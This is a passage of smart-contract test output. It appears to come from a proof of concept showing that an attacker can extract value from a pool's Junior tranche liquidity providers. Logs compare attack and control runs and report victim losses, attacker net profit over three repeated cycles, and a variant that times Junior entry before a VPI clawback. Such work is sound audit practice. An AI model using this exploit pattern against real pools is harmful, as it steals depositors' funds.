    attacker trader balance after  200000000000
    pool totalAssets at open       0
    pool totalAssets at close      0
    senior LP assets               8000160811770
    treasury credit                0
  == RESULT ==
    victim Junior loss (A vs C1)          5078060139
    attacker LP extra USDG (A vs C1)      10894677270
    attacker trading cost                 8550210920
    attacker NET profit                   2344466350
    victim delta from trade alone (C2-C0) 1453500413
    senior LP delta (A vs C1)             40589
    treasury credit in A                  2735384400

[PASS] test_attack_repeatsEveryEpoch() (gas: 22681188)
Logs:
  == RESULT three cycles ==
    victim Junior assets at start         2499981422925
    attacker wealth at start              7699944268775
    cycle 1
      victim Junior, attack               2494795752014
      victim Junior, control              2499873723072
      victim cumulative loss              5077971058
    cycle 2
      victim Junior, attack               2489603763275
      victim Junior, control              2499766021056
      victim cumulative loss              10162257781
    cycle 3
      victim Junior, attack               2484405461700
      victim Junior, control              2499658316875
      victim cumulative loss              15252855175
    attacker wealth, attack               7706662062633
    attacker wealth, control              7699609859573
    attacker cumulative NET profit        7052203060

[PASS] test_mirror_juniorEntryBeforeVpiClawback() (gas: 10819462)
Logs:
  == RESULT mirror, Junior entry before the VPI clawback ==
    VPI accrued by the skew-reducing open -7922184782
    victim Junior before                  2508757685163
    victim Junior, attack                 2503877904085
    victim Junior, control                2508664253877
    victim loss                           4786349792
    attacker trading cost                 5106092226
    attacker NET profit                   1524044017

Suite result: ok. 4 passed; 0 failed; 0 skipped; finished in 372.78ms (315.37ms CPU time)
```

